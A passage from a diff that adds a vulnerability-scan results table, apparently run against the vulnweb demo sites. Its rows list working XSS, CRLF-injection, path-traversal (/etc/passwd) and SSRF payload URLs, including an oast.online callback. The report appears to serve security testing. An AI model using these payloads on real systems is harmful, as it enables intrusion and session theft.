+                            </tr>
+
+                            <tr>
+                                <td>dom-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?cat=&#x27;);alert(1);//" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=&#x27;);alert(1);//</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>dom-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/search.php?test=&#x27;);alert(1);//" target="_blank">http://testphp.vulnweb.com/search.php?test=&#x27;);alert(1);//</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>dom-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&#x27;);alert(1);//" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&#x27;);alert(1);//</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>dom-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?+artist=&#x27;);alert(1);//" target="_blank">http://testphp.vulnweb.com/artists.php?+artist=&#x27;);alert(1);//</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-fuzz-html-tag-injection</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=%3Cxsg%3Eal%28%27xs%27%29%3C%2Fxsg%3E" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=%3Cxsg%3Eal%28%27xs%27%29%3C%2Fxsg%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>alt-shift-x-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?+artist=xlmav+&quot;accesskey=&quot;x&quot;+onclick=&quot;alert(1)&quot;" target="_blank">http://testphp.vulnweb.com/artists.php?+artist=xlmav+&quot;accesskey=&quot;x&quot;+onclick=&quot;alert(1)&quot;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>alt-shift-x-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?artist=xlmav+&quot;accesskey=&quot;x&quot;+onclick=&quot;alert(1)&quot;&amp;cat=xlmav+&quot;accesskey=&quot;x&quot;+onclick=&quot;alert(1)&quot;" target="_blank">http://testphp.vulnweb.com/listproducts.php?artist=xlmav+&quot;accesskey=&quot;x&quot;+onclick=&quot;alert(1)&quot;&amp;cat=xlmav+&quot;accesskey=&quot;x&quot;+onclick=&quot;alert(1)&quot;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-fuzz-html-tag-injection</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=%3Cxsg%3Eal%28%27xs%27%29%3C%2Fxsg%3E&amp;pp=%3Cxsg%3Eal%28%27xs%27%29%3C%2Fxsg%3E" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=%3Cxsg%3Eal%28%27xs%27%29%3C%2Fxsg%3E&amp;pp=%3Cxsg%3Eal%28%27xs%27%29%3C%2Fxsg%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>alt-shift-x-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?artist=xlmav+&quot;accesskey=&quot;x&quot;+onclick=&quot;alert(1)&quot;" target="_blank">http://testphp.vulnweb.com/artists.php?artist=xlmav+&quot;accesskey=&quot;x&quot;+onclick=&quot;alert(1)&quot;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>iframe-bypass-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&quot;&gt;&lt;iframe+src=&quot;data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&quot;&gt;&lt;iframe+src=&quot;data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>iframe-bypass-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&quot;&gt;&lt;iframe+src=&quot;data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;&amp;pp=&quot;&gt;&lt;iframe+src=&quot;data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&quot;&gt;&lt;iframe+src=&quot;data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;&amp;pp=&quot;&gt;&lt;iframe+src=&quot;data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>image-input-tag-xss-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/product.php?pic=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;" target="_blank">http://testphp.vulnweb.com/product.php?pic=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>image-input-tag-xss-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;&amp;pp=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;&amp;pp=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>image-input-tag-xss-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?cat=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>image-input-tag-xss-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>image-input-tag-xss-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?artist=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;" target="_blank">http://testphp.vulnweb.com/artists.php?artist=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-fuzz-html-tag-injection</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&lt;xsg&gt;al(&#x27;xs&#x27;)&lt;/xsg&gt;" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&lt;xsg&gt;al(&#x27;xs&#x27;)&lt;/xsg&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>image-input-tag-xss-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?artist=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;&amp;cat=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;" target="_blank">http://testphp.vulnweb.com/listproducts.php?artist=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;&amp;cat=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>image-input-tag-xss-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?+artist=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;" target="_blank">http://testphp.vulnweb.com/artists.php?+artist=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?+artist=1&#x27;&quot;&gt;&lt;47287" target="_blank">http://testphp.vulnweb.com/artists.php?+artist=1&#x27;&quot;&gt;&lt;47287</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?artist=&#x27;&quot;&gt;&lt;47287" target="_blank">http://testphp.vulnweb.com/artists.php?artist=&#x27;&quot;&gt;&lt;47287</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=CWS%07%0E000x%EF%BF%BD&#x27;&quot;&gt;&lt;47287&amp;pp=12&#x27;&quot;&gt;&lt;47287" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=CWS%07%0E000x%EF%BF%BD&#x27;&quot;&gt;&lt;47287&amp;pp=12&#x27;&quot;&gt;&lt;47287</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/search.php?test={{7*7}}&#x27;&quot;&gt;&lt;47287" target="_blank">http://testphp.vulnweb.com/search.php?test={{7*7}}&#x27;&quot;&gt;&lt;47287</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?artist=gxss&#x27;&quot;&gt;&lt;47287&amp;cat=&lt;sCriPt&gt;new+Image&#x27;&quot;&gt;&lt;47287" target="_blank">http://testphp.vulnweb.com/listproducts.php?artist=gxss&#x27;&quot;&gt;&lt;47287&amp;cat=&lt;sCriPt&gt;new+Image&#x27;&quot;&gt;&lt;47287</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>universal-xss-bypass-waf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/showimage.php?file=./../../../../../etc/passwdxxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;" target="_blank">http://testphp.vulnweb.com/showimage.php?file=./../../../../../etc/passwdxxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&#x27;&quot;&gt;&lt;47287" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&#x27;&quot;&gt;&lt;47287</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-fuzz-html-tag-injection</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=%3Cxsg%3Eal%28%27xs%27%29" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=%3Cxsg%3Eal%28%27xs%27%29</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>universal-xss-bypass-waf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=CWS%07%0E000x%EF%BF%BDxxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;&amp;pp=12xxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=CWS%07%0E000x%EF%BF%BDxxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;&amp;pp=12xxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>universal-xss-bypass-waf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=xxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=xxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-xss-pj</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/product.php?pic=1zqjry%27%22%28%29%7B%7D%3Cx%3E%3A%2F1zqjry%3B9&#x27;&quot;&gt;&lt;47287" target="_blank">http://testphp.vulnweb.com/product.php?pic=1zqjry%27%22%28%29%7B%7D%3Cx%3E%3A%2F1zqjry%3B9&#x27;&quot;&gt;&lt;47287</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-mimetype</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html&amp;mimetype=text/html&amp;pp=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html&amp;mimetype=text/html&amp;pp=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-mimetype</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-mimetype</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?artist=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html" target="_blank">http://testphp.vulnweb.com/artists.php?artist=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-mimetype</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?artist=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html&amp;mimetype=text/html&amp;cat=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;" target="_blank">http://testphp.vulnweb.com/listproducts.php?artist=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html&amp;mimetype=text/html&amp;cat=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-mimetype</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/product.php?pic=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html" target="_blank">http://testphp.vulnweb.com/product.php?pic=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-mimetype</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?+artist=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html" target="_blank">http://testphp.vulnweb.com/artists.php?+artist=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-mimetype</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?cat=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>ssrf-bypass-via-crlf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/showimage.php?file=http://testphp.vulnweb.com@d07rfrkos8d3hpir2bc0frbg9iqot4nsk.oast.online/%0d%0aGET%20/ssrf-request%20HTTP/1.1%0d%0aHost:%20testphp.vulnweb.com%0d%0a%0d%0a" target="_blank">http://testphp.vulnweb.com/showimage.php?file=http://testphp.vulnweb.com@d07rfrkos8d3hpir2bc0frbg9iqot4nsk.oast.online/%0d%0aGET%20/ssrf-request%20HTTP/1.1%0d%0aHost:%20testphp.vulnweb.com%0d%0a%0d%0a</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-fuzz-html-tag-injection</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&lt;xsg&gt;al(&#x27;xs&#x27;)" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&lt;xsg&gt;al(&#x27;xs&#x27;)</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-fuzzing-chinese</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>iframe-bypass-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=&quot;&gt;&lt;iframe+src=&quot;data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=&quot;&gt;&lt;iframe+src=&quot;data:text/html;www.youtube.com/XYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>image-input-tag-xss-fuzzing</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=\&quot;&gt;&lt;input+type=&quot;image&quot;+src=&quot;1&quot;+onerror=&quot;alert(1337)&quot;&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>universal-xss-bypass-waf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=RigCxOASxxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=RigCxOASxxxx&quot;/&gt;&lt;button+popovertarget=bugvsme&gt;CLICK+HERE&lt;/button&gt;&lt;xxx+onbeforetoggle=alert``+popover+id=bugvsme&gt;TEST&lt;/xxx&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-mimetype</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=&lt;/script&gt;&lt;script&gt;&quot;&gt;&lt;img+src=123+onerror=alert(1)&gt;&amp;mimetype=text/html</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-injection-reewardius</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com:8081/%2Fxxx:1%2F%0aDetectify:%20clrf" target="_blank">http://rest.vulnweb.com:8081/%2Fxxx:1%2F%0aDetectify:%20clrf</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-injection-reewardius</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com/%2Fxxx:1%2F%0aDetectify:%20clrf" target="_blank">http://rest.vulnweb.com/%2Fxxx:1%2F%0aDetectify:%20clrf</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>aspx-debug-mode</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/Foobar-debug.aspx" target="_blank">http://testaspnet.vulnweb.com/Foobar-debug.aspx</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testaspnet.vulnweb.com/login.aspx" target="_blank">http://testaspnet.vulnweb.com/login.aspx</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">body:__VIEWSTATE</span> <span class="extractor">POST</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1reewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1reewardius</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:RetURL</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>reflected-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1reewardius" target="_blank">http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1reewardius</a></td>
